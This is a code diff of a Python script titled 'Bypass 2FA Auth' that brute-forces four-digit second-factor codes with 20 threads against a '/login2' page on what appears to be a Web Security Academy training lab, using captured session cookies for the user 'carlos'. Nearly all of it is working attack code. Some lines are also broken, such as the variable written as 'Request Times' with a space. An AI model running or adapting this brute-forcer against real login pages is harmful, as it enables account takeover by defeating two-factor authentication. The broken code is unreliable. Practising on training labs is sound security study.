@@ -1,41 +1,17 @@
-
 #Author: MeowHecker 侯智晟
-#purpose: Testing websit security 
-
+# Bypass 2FA Auth
 import requests
 import threading
 import sys 
 
+url = "https://0ae900ed033f23288166aceb000b003c.web-security-academy.net/login2"
 
-url = "https://0abb00900473ee8581fda7b000210004.web-security-academy.net/login2"
-
-Headers = {
-    "Host": "0abb00900473ee8581fda7b000210004.web-security-academy.net",
-    "Cookie": "session=ZMa2DO1IVwmxTXziQudZArIN2hOTK96N; verify=carlos",
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
-    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-    "Accept-Language": "zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3",
-    "Accept-Encoding": "gzip, deflate",
-    "Content-Type": "application/x-www-form-urlencoded",
-    "Content-Length": "13",
-    "Origin": "https://0a9a007003b6a113810d20ef00100039.web-security-academy.net",
-    "Referer": "https://0a9a007003b6a113810d20ef00100039.web-security-academy.net/login2",
-    "Upgrade-Insecure-Requests": "1",
-    "Sec-Fetch-Dest": "document",
-    "Sec-Fetch-Mode": "navigate",
-    "Sec-Fetch-Site": "same-origin",
-    "Sec-Fetch-User": "?1",
-    "Te": "trailers"
-}
+Headers = {'Host': ' 0ae900ed033f23288166aceb000b003c.web-security-academy.net', 'Cookie': ' verify=carlos; session=706d8zav60yMRSaANT9QUOdIQVYkXLhw', 'Content-Length': ' 13', 'Cache-Control': ' max-age=0', 'Sec-Ch-Ua': ' "Not_A Brand";v="8", "Chromium";v="120"', 'Sec-Ch-Ua-Mobile': ' ?0', 'Sec-Ch-Ua-Platform': ' "Windows"', 'Upgrade-Insecure-Requests': ' 1', 'Origin': ' https://0ae900ed033f23288166aceb000b003c.web-security-academy.net', 'Content-Type': ' application/x-www-form-urlencoded', 'User-Agent': ' Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.199 Safari/537.36', 'Accept': ' text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Sec-Fetch-Site': ' same-origin', 'Sec-Fetch-Mode': ' navigate', 'Sec-Fetch-User': ' ?1', 'Sec-Fetch-Dest': ' document', 'Referer': ' https://0ae900ed033f23288166aceb000b003c.web-security-academy.net/login2', 'Accept-Encoding': ' gzip, deflate, br', 'Accept-Language': ' zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7', 'Priority': ' u=0, i'}
 
 Request Times = 0
-
 def sendRequest(payload,sem): 
     
     global Request Times 
-    
-    
-    
     payloads = {
         "Payload": payload
     }
@@ -61,23 +37,17 @@ def threadingF():
     maxThreading = 20
     sem = threading.BoundedSemaphore(maxThreading)
 
-
-    # str(i).zfill(4) 將每個數字轉換為 4 位數的字串 /0001,0002,0003
     for i in range(10000):
         
         # Custom Payload 
         payload = str(i).zfill(4)
-        
-        
-        
-        sem.acquire() # Signal Acquire (Start) "Singal = Unipue ID"
+
+        sem.acquire() 
         sendRequestHandler = threading.Thread(target=sendRequest, args=(payload,sem))
         sendRequestHandler.start()
         print("Number of active threads:", threading.active_count())
 
     sys.exit()
   
-    
 threadingF()
-
 sys.exit()
